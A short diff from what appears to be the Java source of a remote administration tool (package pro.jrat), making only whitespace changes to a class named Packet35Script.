@@ -4,9 +4,8 @@ import java.io.DataOutputStream;
 
 import pro.jrat.Slave;
 
-
 public class Packet35Script extends AbstractOutgoingPacket {
-	
+
 	private String type;
 	private String content;
 
